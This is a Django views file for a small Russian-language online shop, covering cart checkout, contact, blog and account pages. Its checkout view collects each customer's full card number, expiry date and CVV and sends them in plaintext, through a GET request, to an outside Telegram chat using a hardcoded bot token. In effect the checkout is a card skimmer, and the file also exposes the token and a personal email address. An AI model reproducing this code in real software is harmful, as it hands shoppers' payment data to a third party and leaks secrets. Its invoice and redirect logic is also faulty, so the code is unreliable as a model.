from datetime import datetime
from random import randint

import requests
from django.core.mail import send_mail
from django.shortcuts import render, redirect

# Create your views here.
from MyNewShop import settings
from customers.models import MyUser, Order, ItemOrders
from product.models import Category, Brand
from shop.models import Sell, Team, Address, AboutUs, Blog, Comment, Contact


def invoice_number():
    all1 = []
    d = randint(100000, 999999)
    all1.append(d)
    while d in all1:
        d = randint(100000, 999999)
    return d


def set_about(request):
    team = {
        'abouts': AboutUs.objects.all()[:4],
        'about': 'active',
        'title': 'О нас',
        'teams': Team.objects.all(),
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }
    return render(request, "about.html", team)


def set_cart(request):
    if request.method == "POST":
        first_name = request.POST['first_name']
        last_name = request.POST['last_name']
        email = request.POST['email']
        address = request.POST['address']
        card_name = request.POST['card_name']
        card_number = request.POST['card_number']
        data = request.POST['data']
        pin = request.POST['pin']
        total_price = request.POST['total_price']
        user = MyUser.objects.get(username=request.user.username)
        cart = user.cart.all()

        customer = Order.objects.create(customer=user, address=address,
                                        total_item=total_price, invoice_number=invoice_number())
        d = []
        discount = 0
        for i in cart:
            quantity = int(request.POST[f'item{i.pk}'])
            if i.status == 'sale':
                price1 = i.new_price
                sell = (i.old_price - i.new_price)
                discount += sell*quantity
            else:
                sell = 0
                price1 = i.old_price

            price = int(quantity * price1)
            ItemOrders.objects.create(order=customer, quantity=quantity, product=i, price=price, discount=sell*quantity)
            d.append(f'{i.title} * {quantity} = {quantity * price1}')
            user.cart.remove(i)
        customer.discount = discount
        customer.save()
        order = f"""NEW Заказ
    Имя: {first_name}
    Фамилия: {last_name}
    Продукты: {(" : ").join(d)}
    Обю сумма : {total_price}
    Скидка: {discount}
    Эл.Адрес: {email}
    Адрес: {address}
    Названия карта: {card_name}
    Номер карта: {card_number}
    Expiration: {data}
    СVV: {pin}"""
        base_url = f'https://api.telegram.org/bot5421110622:AAGTrih1SWDeaAEnn2S6erFwFu7Q1hPob5s/sendMessage?chat_id=-716220787&text={order}'
        requests.get(base_url)
        redirect('cart')
    if request.user.is_authenticated:
        user = MyUser.objects.get(username=request.user.username)
        context = {
            'title': 'Корзина',
            'cart_products': user.cart.all(),
            'summa_cart': sum([i.old_price for i in user.cart.all()]),
            'cats': Category.objects.all(),
            "brand": Brand.objects.all().filter(is_active=True),
            'sells': Sell.objects.all().filter(is_active=True),
            'address': Address.objects.all().filter(is_active=True)
        }
    else:
        context = {
            'title': 'Корзина',
            'cats': Category.objects.all(),
            "brand": Brand.objects.all().filter(is_active=True),
            'sells': Sell.objects.all().filter(is_active=True),
            'address': Address.objects.all().filter(is_active=True)

        }
    return render(request, "cart.html", context)


def set_contact(request):
    if request.method == 'POST':
        name = request.POST['name']
        subject = request.POST['subject']
        email = request.POST['email']
        message = request.POST['message']
        Contact.objects.create(name=name, subject=subject, email=email, message=message)
        send_mail(
            'ByNurs shop',
            f'New message for you \nName: {name}\nEmail: {email}\nSubject: {subject}\nMessage: {message}\nДата отправки: {datetime.now()}',
            settings.EMAIL_HOST_USER,
            ['normosbekov@gmail.com', ],
            fail_silently=True,
        )
        sms = f'New message for you \nName: {name}\nEmail: {email}\nSubject: {subject}\nMessage: {message}\nДата отправки: {datetime.now()}'
        base_url = f'https://api.telegram.org/bot5421110622:AAGTrih1SWDeaAEnn2S6erFwFu7Q1hPob5s/sendMessage?chat_id=-716220787&text={sms}'
        requests.get(base_url)
        redirect('contact')
    context = {
        'title': 'Контакт',
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }
    return render(request, "contact-us.html", context)


def set_my_account(request):
    context = {
        'title': 'Мой кабинет',
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }
    return render(request, "my-account.html", context)


def set_service(request):
    context = {
        'title': 'Сервис',
        'about': AboutUs.objects.all(),
        'teams': Team.objects.all(),
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }
    return render(request, "service.html", context)





def set_blog_detail(request, pk):
    if request.method == 'POST':
        text = request.POST['text']
        user1 = MyUser.objects.get(username=request.user.username)
        comment = Comment(blog_id=pk, text=text, owner=user1)
        comment.save()
    context = {
        'title': 'Блог',
        'one_blog': Blog.objects.get(pk=pk),
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }
    return render(request, "blog_detail.html", context)


def set_blog(request):
    context = {
        'title': 'Блог',
        'blog': Blog.objects.all(),
        'cats': Category.objects.all(),
        "brand": Brand.objects.all().filter(is_active=True),
        'sells': Sell.objects.all().filter(is_active=True),
        'address': Address.objects.all().filter(is_active=True)
    }

    return render(request, "blogs.html", context)
